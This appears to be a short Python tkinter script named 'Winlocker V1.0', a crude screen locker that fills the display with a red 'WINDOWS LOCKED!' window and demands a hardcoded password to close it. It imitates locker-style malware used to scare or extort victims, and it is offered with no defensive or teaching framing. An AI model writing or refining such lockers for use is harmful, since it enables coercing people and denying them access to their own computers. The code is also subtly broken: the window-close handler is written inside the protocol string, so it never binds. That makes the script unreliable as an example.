from tkinter import *
import tkinter as tk
from tkinter import messagebox

def btn_click():
    k = ent.get()
    if k == 'o22102007':
        messagebox.showinfo(title = 'Winlocker V1.0', message = 'Windows UNLOCKED!')
        root.destroy()
    else:
        messagebox.showerror(title = 'Winlocker V1.0', message = 'Wrong Password!')
def exits():
    if ent.get() != 'o22102007':
        messagebox.showerror(title = 'Winlocker V1.0', message = 'Wrong Password!')

root = Tk()
root.title("Winlocker V1.0")
root.attributes("-fullscreen", True)
root.resizable(width = False, height = False)
root['bg'] = 'red'
root.protocol('WM_DELETE_WINDOW, exits')
Label(root, text = 'WINDOWS LOCKED!', font = 'Arial 73', bg = 'red', fg = 'white').pack()
Label(root, text = 'ENTER PASSWORD!', font = 'Arial 50', bg = 'red', fg = 'white').pack()
ent = Entry(root, text = '', font = 'Arial 50', width = 19)
ent.pack()
Button(root, text = 'UNLOCK!', font = 'Arial 50', bg = 'blue', fg = 'white', command = btn_click).pack()
root.mainloop()
